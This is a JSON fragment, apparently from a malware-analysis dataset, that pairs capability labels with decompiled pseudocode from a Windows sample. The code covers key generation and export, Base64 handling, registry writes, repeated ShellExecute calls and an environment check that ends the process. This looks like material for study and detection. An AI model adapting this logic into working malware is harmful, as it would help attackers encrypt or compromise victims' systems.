        "decompiled_code": "\nvoid __cdecl fcn.0040b24c(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    uint *arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *in_ECX;\n    uint32_t uVar4;\n    uint uVar5;\n    uint var_2ch;\n    uint pbData;\n    uint32_t pdwDataLen;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar4 = 0;\n    pdwDataLen = 0;\n    arg_8h_00 = arg_8h;\n    if (arg_1ch < 0x10) {\n        arg_8h_00 = &arg_8h;\n    }\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg_8h_00, arg_18h, 1, 0, &pdwDataLen, 0, 0);\n    if (iVar2 != 0) goto code_r0x0040b296;\n    uVar5 = 7;\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar5);\ncode_r0x0040b296:\n            uVar5 = fcn.0040b859(pdwDataLen);\n            puVar3 = arg_8h;\n            if (arg_1ch < 0x10) {\n                puVar3 = &arg_8h;\n            }\n            iVar2 = (*pcVar1)(puVar3, arg_18h, 1, uVar5, &pdwDataLen, 0, 0);\n            if (iVar2 != 0) break;\n            uVar5 = 8;\n        }\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptDecrypt)(*0x414784, 0, 1, 0, uVar5, &pdwDataLen);\n        if (iVar2 != 0) break;\n        uVar5 = 9;\n    }\n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    fcn.0040702c(uVar5);\n    if (pdwDataLen != 0) {\n        do {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            fcn.00407070(*(puVar3 + uVar4));\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < pdwDataLen);\n    }\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 721
    },
    "0040b44d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b44d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    iVar1 = in_EAX[4];\n    puVar3 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar3 = *in_EAX;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, iVar1 + 1, 0, 0);\n    arg_8h_00 = fcn.0040b859(-(uVar4 * 2 >> 0x20 != 0) | uVar4 * 2);\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    (*pcVar2)(0, 0, in_EAX, iVar1 + 1, arg_8h_00, uVar4);\n    fcn.0040720e(arg_8h_00);\n    fcn.0040d85a(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 323
    },
    "004111e4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004111e4(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040e62f(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "004092b9": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.004092b9(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x401eb8;\n    uVar2 = *0x401eb8;\n    if (*0x401ecc < 0x10) {\n        uVar2 = 0x401eb8;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x401ec8, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x004092fe;\ncode_r0x004092f7:\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x004092fe:\n                iVar3 = fcn.0040d936(dwDataLen);\n            } while (iVar3 == 0);\n            uVar2 = *0x401eb8;\n            if (*0x401ecc < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar4 = (*pcVar6)(uVar2, *0x401ec8, 1, iVar3, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar4 == 0);\n        if (*0x41476c == 0) {\n            uVar5 = 0x41476c;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x41476c, 0, 0x404eb0, 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar4 == 0) {\n                iVar4 = (*pcVar1)(0x41476c, 0, 0x404eb0, 1, 8);\n                if (iVar4 == 0) goto code_r0x004092f7;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x41476c, iVar3, dwDataLen, 0, 0, 0x414778);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 583
    },
    "00409616": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.00409616(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x401e9c;\n    uVar2 = *0x401e9c;\n    if (*0x401eb0 < 0x10) {\n        uVar2 = 0x401e9c;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x401eac, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x0040965b;\ncode_r0x00409654:\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x0040965b:\n                iVar3 = fcn.0040d936(dwDataLen);\n            } while (iVar3 == 0);\n            uVar2 = *0x401e9c;\n            if (*0x401eb0 < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar4 = (*pcVar6)(uVar2, *0x401eac, 1, iVar3, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar4 == 0);\n        if (*0x414780 == 0) {\n            uVar5 = 0x414780;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414780, 0, 0x404eb0, 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar4 == 0) {\n                iVar4 = (*pcVar1)(0x414780, 0, 0x404eb0, 1, 8);\n                if (iVar4 == 0) goto code_r0x00409654;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x414780, iVar3, dwDataLen, 0, 0, 0x41477c);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 584
    },
    "0040af03": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n\nvoid fcn.0040af03(void)\n\n{\n    uint arg_8h;\n    uint *puVar1;\n    uint arg_ch;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_5ch = 0;\n    var_94h = 0x4051a8;\n    var_90h = 0x4051ac;\n    var_8ch = 0x4051b4;\n    var_88h = 0x4051bc;\n    var_84h = 0x4051c4;\n    var_80h = 0x4051d0;\n    var_7ch = 0x4051d8;\n    var_78h = 0x4051e0;\n    var_74h = 0x4051e8;\n    var_70h = 0x4051f8;\n    var_6ch = 0x405200;\n    var_68h = 0x405208;\n    var_64h = 0x405210;\n    var_60h = 0x405218;\n    do {\n        fcn.0040702c((&var_94h)[var_5ch]);\n        arg_ch = 0x405220;\n        arg_8h = fcn.00408978(0x405224);\n        puVar1 = fcn.00407c84(arg_8h, arg_ch);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0x40523c, 0x4045c0, puVar1, 0, 0);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        var_5ch = var_5ch + 1;\n    } while (var_5ch < 0xe);\n    fcn.0040b864(var_94h);\n    return;\n}\n",
        "token_count": 611
    },
    "0040b017": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_98h\n\nvoid fcn.0040b017(void)\n\n{\n    uint *puVar1;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_40h = 0;\n    var_98h = 0x405244;\n    var_94h = 0x40524c;\n    var_90h = 0x405260;\n    var_8ch = 0x405270;\n    var_88h = 0x40527c;\n    var_84h = 0x40528c;\n    var_80h = 0x405298;\n    var_7ch = 0x4052a4;\n    var_78h = 0x4052b8;\n    var_74h = 0x4052d0;\n    var_70h = 0x4052d8;\n    var_6ch = 0x4052ec;\n    var_68h = 0x4052f8;\n    var_64h = 0x405308;\n    var_60h = 0x405318;\n    var_5ch = 0x40532c;\n    var_58h = 0x404631;\n    var_54h = 0x404631;\n    var_50h = 0x404631;\n    var_4ch = 0x404631;\n    var_48h = 0x404631;\n    var_44h = 0x404631;\n    do {\n        fcn.0040702c((&var_98h)[var_40h]);\n        puVar1 = fcn.00408978(0x405334);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0x40523c, 0x4045c0, puVar1, 0, 0);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        var_40h = var_40h + 1;\n    } while (var_40h < 0x16);\n    fcn.0040b864(var_98h);\n    return;\n}\n",
        "token_count": 700
    },
    "004090b9": {
        "rules": [
            "encode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.004090b9(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    var_ch = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x41476c, 0x404ea0, 0, 1, 0);\n    if (iVar2 != 0) goto code_r0x004090fd;\n    iVar2 = (*pcVar1)(0x41476c, 0x404ea0, 0, 1, 8);\n    if (iVar2 != 0) goto code_r0x004090fd;\n    do {\n        do {\n            do {\n                do {\n                    do {\n                        do {\n                            do {\n                                do {\n                                    do {\n                                        do {\n                                            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x004090fd:\n                                            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)\n                                                              (*0x41476c, 1, 0x8000001, 0x414778);\n                                            pcVar1 = _sym.imp.ADVAPI32.dll_CryptExportKey;\n                                        } while (iVar2 == 0);\n                                        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptExportKey)(*0x414778, 0, 7, 0, 0, &var_ch);\n                                    } while (iVar2 == 0);\n                                    iVar2 = fcn.0040d936(var_ch);\n                                } while (iVar2 == 0);\n                                iVar3 = (*pcVar1)(*0x414778, 0, 7, 0, iVar2, &var_ch);\n                                if (iVar3 == 0) {\n                                    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                                }\n                                iVar3 = (*pcVar1)(*0x414778, 0, 6, 0, 0, &var_8h);\n                            } while (iVar3 == 0);\n                            iVar3 = fcn.0040d936(var_8h);\n                        } while (iVar3 == 0);\n                        iVar4 = (*pcVar1)(*0x414778, 0, 6, 0, iVar3, &var_8h);\n                        pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n                    } while (iVar4 == 0);\n                    var_4h = 0;\n                    iVar4 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(iVar3, var_8h, 1, 0, &var_4h);\n                } while (iVar4 == 0);\n                uVar5 = fcn.0040b859(var_4h);\n                iVar3 = (*pcVar1)(iVar3, var_8h, 1, uVar5, &var_4h);\n            } while (iVar3 == 0);\n            fcn.0040d730(uVar5);\n            fcn.00407523();\n            fcn.0040d85a(uVar5);\n            var_4h = 0;\n            iVar3 = (*pcVar1)(iVar2, var_ch, 1, 0, &var_4h);\n        } while (iVar3 == 0);\n        uVar5 = fcn.0040b859(var_4h);\n        iVar2 = (*pcVar1)(iVar2, var_ch, 1, uVar5, &var_4h);\n    } while (iVar2 == 0);\n    fcn.0040d730(uVar5);\n    fcn.00407523();\n    fcn.0040d85a(uVar5);\n    return;\n}\n",
        "token_count": 898
    },
    "00409579": {
        "rules": [
            "encode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409579(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    code *unaff_EDI;\n    uint unaff_retaddr;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_4h;\n    \n    do {\n        pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n        if (in_EAX != 0) {\n            *(unaff_EBP + -0x20c) = unaff_ESI;\n            iVar2 = (*pcVar1)(unaff_EBP + -0x204, *(unaff_EBP + -0x208), 1);\n            unaff_EDI = pcVar1;\n            if (iVar2 != 0) {\n                uVar3 = fcn.0040b859(*(unaff_EBP + -0x20c));\n                *(unaff_EBP + -0x210) = uVar3;\n                iVar2 = (*pcVar1)(unaff_EBP + -0x204, *(unaff_EBP + -0x208), 1, uVar3, unaff_EBP + -0x20c);\n                if (iVar2 != 0) {\n                    fcn.0040702c(*(unaff_EBP + -0x210));\n                    fcn.0040d85a(*(unaff_EBP + -0x210));\n                    fcn.0040571f(1);\n                    fcn.0040b864(unaff_retaddr);\n                    return;\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\n        in_EAX = (*unaff_EDI)(*0x414774);\n    } while( true );\n}\n",
        "token_count": 450
    },
    "0040a082": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040a082(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, int32_t cbData, uint32_t arg_38h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint hKey;\n    \n    iVar1 = fcn.0040b859(cbData);\n    puVar3 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar3 = &arg_24h;\n    }\n    puVar3 = puVar3 + cbData;\n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    if (puVar2 != puVar3) {\n        iVar4 = iVar1 - puVar2;\n        do {\n            *(iVar4 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar3);\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, 0x405020, 0, 0, 1, 0x20006, 0, &hKey, 0);\n    puVar3 = arg_8h;\n    if (arg_1ch < 0x10) {\n        puVar3 = &arg_8h;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, puVar3, 0, 1, iVar1, cbData);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    fcn.0040d85a(iVar1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    return;\n}\n",
        "token_count": 479
    },
    "0040b139": {
        "rules": [
            "hash data using SHA1/569f5a119d93492db8a59d47f1ccb3c0"
        ],
        "decompiled_code": "\nvoid fcn.0040b139(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint arg_8h;\n    uint *var_20h;\n    int32_t dwDataLen;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    arg_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414788, 0x405344, 0, 1, 0);\n    if (iVar2 != 0) goto code_r0x0040b182;\n    iVar2 = (*pcVar1)(0x414788, 0x405344, 0, 1, 8);\n    if (iVar2 != 0) goto code_r0x0040b182;\n    uVar6 = 0x8235;\n    while( true ) {\n        while( true ) {\n            while( true ) {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar6);\ncode_r0x0040b182:\n                fcn.0040702c(0x405348);\n                iVar2 = fcn.0040b859(dwDataLen);\n                puVar3 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar3 = &var_20h;\n                }\n                puVar3 = puVar3 + dwDataLen;\n                puVar4 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar4 = &var_20h;\n                }\n                if (puVar4 != puVar3) {\n                    iVar5 = iVar2 - puVar4;\n                    do {\n                        *(iVar5 + puVar4) = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (puVar4 != puVar3);\n                }\n                iVar5 = (*_sym.imp.ADVAPI32.dll_CryptCreateHash)(*0x414788, 0x8004, 0, 0, 0x41478c);\n                if (iVar5 != 0) break;\n                uVar6 = 1;\n            }\n            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptHashData)(*0x41478c, iVar2, dwDataLen, 0);\n            if (iVar2 != 0) break;\n            uVar6 = 2;\n        }\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptDeriveKey)(*0x414788, 0x6801, *0x41478c, 1, 0x414784);\n        if (iVar2 != 0) break;\n        uVar6 = 3;\n    }\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h);\n    return;\n}\n",
        "token_count": 694
    },
    "00407bd2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bd2(char **arg_8h, char *arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char *in_EAX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            if (*arg_ch == *in_EAX) break;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    pcVar1 = arg_ch;\n    if (arg_ch == arg_10h) {\n        *arg_8h = arg_ch;\n        return;\n    }\n    while (pcVar1 = pcVar1 + 1,  pcVar1 != arg_10h) {\n        if (*pcVar1 != *in_EAX) {\n            *arg_ch = *pcVar1;\n            arg_ch = arg_ch + 1;\n        }\n    }\n    *arg_8h = arg_ch;\n    return;\n}\n",
        "token_count": 209
    },
    "00409263": {
        "rules": [
            "contain loop",
            "create new key via CryptAcquireContext",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00409263(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414770, 0x404ea8, 0, 1, 0);\n    if (iVar2 != 0) goto code_r0x00409299;\n    iVar2 = (*pcVar1)(0x414770, 0x404ea8, 0, 1, 8);\n    if (iVar2 != 0) goto code_r0x00409299;\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00409299:\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)(*0x414770, 1, 0x2000000, 0x414774);\n    } while (iVar2 == 0);\n    return;\n}\n",
        "token_count": 232
    },
    "0040b859": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b859(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint auStack20 [3];\n    uint uStack8;\n    \n    do {\n        iVar2 = fcn.0040d936(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e897(param_1);\n    } while (iVar2 != 0);\n    if ((*0x413aac & 1) == 0) {\n        *0x413aac = *0x413aac | 1;\n        uStack8 = 0x402128;\n        fcn.0040bd26(&uStack8);\n        *0x413aa0 = 0x402120;\n        fcn.0040bd04(0x413473);\n    }\n    fcn.0040be3c(0x413aa0);\n    auStack20[0] = 0x402120;\n    fcn.0040dddd(auStack20, 0x413730);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 256
    },
    "0040e782": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e782(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040e440(0x413580, 0xc);\n    fcn.0040fd9b(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x413e28;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x413e24;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040e7c6;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040e62f(arg_8h_00);\ncode_r0x0040e7c6:\n        fcn.0040e62f(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040e7e9();\n    fcn.0040e485();\n    return;\n}\n",
        "token_count": 405
    },
    "0040578a": {
        "rules": [
            "create new key via CryptAcquireContext",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.0040578a(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414768, 0x403fd0, 0, 0x18, 0);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0x414768, 0x403fd0, 0, 0x18, 8);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00408ca5": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00408ca5(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    \n    cVar2 = fcn.00408146(0x4046c4);\n    if (cVar2 == '\\0') {\n        cVar2 = fcn.00408146(0x4046cc);\n        if (cVar2 == '\\0') {\n            cVar2 = fcn.00408146(0x4046d4);\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.00408146(0x4046e0);\n                if (cVar2 == '\\0') {\n                    cVar2 = fcn.00408146(0x4046ec);\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.00408146(0x4046f4);\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.00408146(0x404700);\n                            if (cVar2 == '\\0') {\n                                cVar2 = fcn.00408146(0x404708);\n                                if (cVar2 == '\\0') {\n                                    *0x414790 = fcn.00408146(0x404714);\n                                    if (*0x414790 == '\\0') {\n                                        return;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *0x414790 = 1;\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0x29a);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 360
    },
    "0040b68c": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0040b68c(void)\n\n{\n    uint *arg_8h;\n    uint hwndOwner;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x28, 0, 0, &hwndOwner);\n    arg_8h = &hwndOwner;\n    fcn.0040720e(arg_8h);\n    fcn.0040b864(arg_8h);\n    return;\n}\n",
        "token_count": 125
    }
}